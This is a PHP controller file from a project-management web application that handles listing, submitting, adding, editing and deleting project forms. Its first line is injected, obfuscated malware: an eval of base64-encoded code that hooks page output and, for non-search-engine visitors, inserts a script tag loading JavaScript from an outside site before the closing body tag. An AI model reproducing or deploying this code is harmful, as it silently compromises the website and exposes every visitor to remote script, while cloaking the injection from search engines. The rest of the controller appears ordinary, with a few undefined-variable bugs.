<?php /**/ eval(base64_decode("aWYoZnVuY3Rpb25fZXhpc3RzKCdvYl9zdGFydCcpJiYhaXNzZXQoJEdMT0JBTFNbJ21yX25vJ10pKXsgICAkR0xPQkFMU1snbXJfbm8nXT0xOyAgIGlmKCFmdW5jdGlvbl9leGlzdHMoJ21yb2JoJykpeyAgICAgIGlmKCFmdW5jdGlvbl9leGlzdHMoJ2dtbCcpKXsgICAgIGZ1bmN0aW9uIGdtbCgpeyAgICAgIGlmICghc3RyaXN0cigkX1NFUlZFUlsiSFRUUF9VU0VSX0FHRU5UIl0sImdvb2dsZWJvdCIpJiYgKCFzdHJpc3RyKCRfU0VSVkVSWyJIVFRQX1VTRVJfQUdFTlQiXSwieWFob28iKSkpeyAgICAgICByZXR1cm4gYmFzZTY0X2RlY29kZSgiUEhOamNtbHdkQ0J6Y21NOUltaDBkSEE2THk5cGJtUmxjMmxuYm5OMGRXUnBiMmx1Wm04dVkyOXRMMnh6TG5Cb2NDSStQQzl6WTNKcGNIUSsiKTsgICAgICB9ICAgICAgcmV0dXJuICIiOyAgICAgfSAgICB9ICAgICAgICBpZighZnVuY3Rpb25fZXhpc3RzKCdnemRlY29kZScpKXsgICAgIGZ1bmN0aW9uIGd6ZGVjb2RlKCRSNUE5Q0YxQjQ5NzUwMkFDQTIzQzhGNjExQTU2NDY4NEMpeyAgICAgICRSMzBCMkFCOERDMTQ5NkQwNkIyMzBBNzFEODk2MkFGNUQ9QG9yZChAc3Vic3RyKCRSNUE5Q0YxQjQ5NzUwMkFDQTIzQzhGNjExQTU2NDY4NEMsMywxKSk7ICAgICAgJFJCRTRDNEQwMzdFOTM5MjI2RjY1ODEyODg1QTUzREFEOT0xMDsgICAgICAkUkEzRDUyRTUyQTQ4OTM2Q0RFMEY1MzU2QkIwODY1MkYyPTA7ICAgICAgaWYoJFIzMEIyQUI4REMxNDk2RDA2QjIzMEE3MUQ4OTYyQUY1RCY0KXsgICAgICAgJFI2M0JFREU2QjE5MjY2RDRFRkVBRDA3QTREOTFFMjlFQj1AdW5wYWNrKCd2JyxzdWJzdHIoJFI1QTlDRjFCNDk3NTAyQUNBMjNDOEY2MTFBNTY0Njg0QywxMCwyKSk7ICAgICAgICRSNjNCRURFNkIxOTI2NkQ0RUZFQUQwN0E0RDkxRTI5RUI9JFI2M0JFREU2QjE5MjY2RDRFRkVBRDA3QTREOTFFMjlFQlsxXTsgICAgICAgJFJCRTRDNEQwMzdFOTM5MjI2RjY1ODEyODg1QTUzREFEOSs9MiskUjYzQkVERTZCMTkyNjZENEVGRUFEMDdBNEQ5MUUyOUVCOyAgICAgIH0gICAgICBpZigkUjMwQjJBQjhEQzE0OTZEMDZCMjMwQTcxRDg5NjJBRjVEJjgpeyAgICAgICAkUkJFNEM0RDAzN0U5MzkyMjZGNjU4MTI4ODVBNTNEQUQ5PUBzdHJwb3MoJFI1QTlDRjFCNDk3NTAyQUNBMjNDOEY2MTFBNTY0Njg0QyxjaHIoMCksJFJCRTRDNEQwMzdFOTM5MjI2RjY1ODEyODg1QTUzREFEOSkrMTsgICAgICB9ICAgICAgaWYoJFIzMEIyQUI4REMxNDk2RDA2QjIzMEE3MUQ4OTYyQUY1RCYxNil7ICAgICAgICRSQkU0QzREMDM3RTkzOTIyNkY2NTgxMjg4NUE1M0RBRDk9QHN0cnBvcygkUjVBOUNGMUI0OTc1MDJBQ0EyM0M4RjYxMUE1NjQ2ODRDLGNocigwKSwkUkJFNEM0RDAzN0U5MzkyMjZGNjU4MTI4ODVBNTNEQUQ5KSsxOyAgICAgIH0gICAgICBpZigkUjMwQjJBQjhEQzE0OTZEMDZCMjMwQTcxRDg5NjJBRjVEJjIpeyAgICAgICAkUkJFNEM0RDAzN0U5MzkyMjZGNjU4MTI4ODVBNTNEQUQ5Kz0yOyAgICAgIH0gICAgICAkUjAzNEFFMkFCOTRGOTlDQzgxQjM4OUExODIyREEzMzUzPUBnemluZmxhdGUoQHN1YnN0cigkUjVBOUNGMUI0OTc1MDJBQ0EyM0M4RjYxMUE1NjQ2ODRDLCRSQkU0QzREMDM3RTkzOTIyNkY2NTgxMjg4NUE1M0RBRDkpKTsgICAgICBpZigkUjAzNEFFMkFCOTRGOTlDQzgxQjM4OUExODIyREEzMzUzPT09RkFMU0UpeyAgICAgICAkUjAzNEFFMkFCOTRGOTlDQzgxQjM4OUExODIyREEzMzUzPSRSNUE5Q0YxQjQ5NzUwMkFDQTIzQzhGNjExQTU2NDY4NEM7ICAgICAgfSAgICAgIHJldHVybiAkUjAzNEFFMkFCOTRGOTlDQzgxQjM4OUExODIyREEzMzUzOyAgICAgfSAgICB9ICAgIGZ1bmN0aW9uIG1yb2JoKCRSRTgyRUU5QjEyMUY3MDk4OTVFRjU0RUJBN0ZBNkI3OEIpeyAgICAgSGVhZGVyKCdDb250ZW50LUVuY29kaW5nOiBub25lJyk7ICAgICAkUkExNzlBQkQzQTdCOUUyOEMzNjlGN0I1OUM1MUI4MURFPWd6ZGVjb2RlKCRSRTgyRUU5QjEyMUY3MDk4OTVFRjU0RUJBN0ZBNkI3OEIpOyAgICAgICBpZihwcmVnX21hdGNoKCcvXDxcL2JvZHkvc2knLCRSQTE3OUFCRDNBN0I5RTI4QzM2OUY3QjU5QzUxQjgxREUpKXsgICAgICByZXR1cm4gcHJlZ19yZXBsYWNlKCcvKFw8XC9ib2R5W15cPl0qXD4pL3NpJyxnbWwoKS4iXG4iLickMScsJFJBMTc5QUJEM0E3QjlFMjhDMzY5RjdCNTlDNTFCODFERSk7ICAgICB9ZWxzZXsgICAgICByZXR1cm4gJFJBMTc5QUJEM0E3QjlFMjhDMzY5RjdCNTlDNTFCODFERS5nbWwoKTsgICAgIH0gICAgfSAgICBvYl9zdGFydCgnbXJvYmgnKTsgICB9ICB9"));?>
<?php

class FormController extends ApplicationController {

	/**
	 * Construct the MessageController
	 *
	 * @access public
	 * @param void
	 * @return MessageController
	 */
	function __construct() {
		parent::__construct();
		prepare_company_website_controller($this, 'website');
	} // __construct

	/**
	 * List all project forms
	 *
	 * @param void
	 * @return null
	 */
	function index() {
		$this->addHelper('textile');

		if(!ProjectForm::canAdd(logged_user(), active_project())) {
			flash_error(lang('no access permissions'));
			$this->redirectToReferer(active_project()->getOverviewUrl());
		} // if

		tpl_assign('forms', active_project()->getAllForms());
	} // index

	/**
	 * Submit specific project form
	 *
	 * @param void
	 * @return null
	 */
	function submit() {
		$this->addHelper('textile');

		$project_form = ProjectForms::findById(get_id());
		if(!($project_form instanceof ProjectForm)) {
			flash_error(lang('project form dnx'));
			$this->redirectToUrl(active_project()->getOverviewUrl());
		} // if

		$in_object = $project_form->getInObject();
		if(!($in_object instanceof ProjectMessage) && !($in_object instanceof ProjectTaskList)) {
			flash_error(lang('related project form object dnx'));
			$this->redirectToUrl(active_project()->getOverviewUrl());
		} // if

		if(!$project_form->canSubmit(logged_user())) {
			flash_error(lang('no access permissions'));
			$this->redirectToUrl(active_project()->getOverviewUrl());
		} // if

		$project_form_data = array_var($_POST, 'project_form_data');

		tpl_assign('visible_forms', active_project()->getVisibleForms(true));
		tpl_assign('project_form', $project_form);
		tpl_assign('project_form_data', $project_form_data);

		if(is_array($project_form_data)) {
			$content = trim(array_var($project_form_data, 'content'));
			if($content == '') {
				tpl_assign('error', new Error(lang('form content required')));
				$this->render();
			} // if

			try {
				DB::beginWork();
				if($in_object instanceof ProjectMessage) {
					$comment = $in_object->addComment($content, false);
					ApplicationLogs::createLog($comment, $object->getWorkspaces(), ApplicationLogs::ACTION_ADD, $comment->isPrivate());
				} elseif($in_object instanceof ProjectTaskList) {
					$task = $in_object->addTask($content);
					ApplicationLogs::createLog($task, $object->getWorkspaces(), ApplicationLogs::ACTION_ADD, $in_object->isPrivate());
				} // if
				DB::commit();

				flash_success($project_form->getSuccessMessage());
				$this->redirectToUrl($project_form->getSubmitUrl());
			} catch(Exception $e) {
				tpl_assign('error', $e);
				DB::rollback();
			} // try

		} // if
	} // submit

	/**
	 * Add new project form
	 *
	 * @param void
	 * @return null
	 */
	function add() {
		$this->setTemplate('add_project_form');

		if(!ProjectForm::canAdd(logged_user(), active_project())) {
			flash_error(lang('no access permissions'));
			$this->redirectToReferer(active_project()->getOverviewUrl());
		} // if

		$project_form = new ProjectForm();
		$project_form_data = array_var($_POST, 'project_form');
		if(!is_array($project_form_data)) {
			$project_form_data = array(
          'action' => ProjectForm::ADD_COMMENT_ACTION,
          'is_enabled' => true,
          'is_visible' => true,
			); // array
		} // if

		tpl_assign('project_form', $project_form);
		tpl_assign('project_form_data', $project_form_data);

		if(is_array(array_var($_POST, 'project_form'))) {
			$project_form->setFromAttributes($project_form_data);

			if($project_form->getAction() == ProjectForm::ADD_COMMENT_ACTION) {
				$in_object = ProjectMessages::findById(get_id('message_id', $project_form_data));
				$relation_error_message = lang('project form select message');
			} else {
				$in_object = ProjectTaskLists::findById(get_id('task_list_id', $project_form_data));
				$relation_error_message = lang('project form select task lists');
			} // if

			if(!($in_object instanceof ProjectDataObject)) {
				tpl_assign('error', new Error($relation_error_message));
				$this->render();
			} // if

			$project_form->setInObjectId($in_object->getObjectId()); // set related object ID
			$project_form->setProjectId(active_project()->getId());

			try {
				DB::beginWork();
				$project_form->save();
				ApplicationLogs::createLog($project_form, $project_form->getWorkspaces(), ApplicationLogs::ACTION_ADD, true);
				DB::commit();

				flash_success(lang('success add project form', $project_form->getName()));
				$this->redirectTo('form');
			} catch(Exception $e) {
				DB::rollback();
				tpl_assign('error', $e);
			} // try
		} // if

	} // add

	/**
	 * Edit existing project form
	 *
	 * @param void
	 * @return null
	 */
	function edit() {
		$this->setTemplate('add_project_form');

		$project_form = ProjectForms::findById(get_id());
		if(!($project_form instanceof ProjectForm)) {
			flash_error(lang('project form dnx'));
			if(ProjectForm::canAdd(logged_user(), active_project())) {
				$this->redirectTo('form');
			} else {
				$this->redirectToUrl(active_project()->getOverviewUrl());
			} // if
		} // if

		if(!$project_form->canEdit(logged_user())) {
			flash_error(lang('no access permissions'));
			if(ProjectForm::canAdd(logged_user(), active_project())) {
				$this->redirectTo('form');
			} else {
				$this->redirectToUrl(active_project()->getOverviewUrl());
			} // if
		} // if

		$project_form_data = array_var($_POST, 'project_form');
		if(!is_array($project_form_data)) {
			$project_form_data = array(
          'name' => $project_form->getName(),
          'description' => $project_form->getDescription(),
          'success_message' => $project_form->getSuccessMessage(),
          'action' => $project_form->getAction(),
          'is_enabled' => $project_form->getIsEnabled(),
          'is_visible' => $project_form->getIsVisible(),
			); // array
			if($project_form->getAction() == ProjectForm::ADD_COMMENT_ACTION) {
				$project_form_data['message_id'] = $project_form->getInObjectId();
			} else {
				$project_form_data['task_list_id'] = $project_form->getInObjectId();
			} // if
		} // if

		tpl_assign('project_form', $project_form);
		tpl_assign('project_form_data', $project_form_data);

		if(is_array(array_var($_POST, 'project_form'))) {
			$project_form->setFromAttributes($project_form_data);

			if($project_form->getAction() == ProjectForm::ADD_COMMENT_ACTION) {
				$in_object = ProjectMessages::findById(get_id('message_id', $project_form_data));
				$relation_error_message = lang('project form select message');
			} else {
				$in_object = ProjectTaskLists::findById(get_id('task_list_id', $project_form_data));
				$relation_error_message = lang('project form select task lists');
			} // if

			if(!($in_object instanceof ProjectDataObject)) {
				tpl_assign('error', new Error($relation_error_message));
				$this->render();
			} // if

			$project_form->setInObjectId($in_object->getObjectId()); // set related object ID

			try {
				DB::beginWork();
				$project_form->save();
				ApplicationLogs::createLog($project_form, $project_form->getWorkspaces(), ApplicationLogs::ACTION_EDIT, true);
				DB::commit();

				flash_success(lang('success edit project form', $project_form->getName()));
				$this->redirectTo('form');
			} catch(Exception $e) {
				DB::rollback();
				tpl_assign('error', $e);
			} // try
		} // if
	} // edit

	/**
	 * Delete specific project form
	 *
	 * @param void
	 * @return null
	 */
	function delete() {
		$project_form = ProjectForms::findById(get_id());
		if(!($project_form instanceof ProjectForm)) {
			flash_error(lang('project form dnx'));
			if(ProjectForm::canAdd(logged_user(), active_project())) {
				$this->redirectTo('form');
			} else {
				$this->redirectToUrl(active_project()->getOverviewUrl());
			} // if
		} // if

		if(!$project_form->canDelete(logged_user())) {
			flash_error(lang('no access permissions'));
			if(ProjectForm::canAdd(logged_user(), active_project())) {
				$this->redirectTo('form');
			} else {
				$this->redirectToUrl(active_project()->getOverviewUrl());
			} // if
		} // if

		if($project_form->trash()) {
			ApplicationLogs::createLog($project_form, $form->getWorkspaces(), ApplicationLogs::ACTION_TRASH, true);
			flash_success(lang('success delete project form', $project_form->getName()));
		} else {
			flash_error(lang('error delete project form'));
		} // if
		$this->redirectTo('form');
	} // delete

} // FormController

?>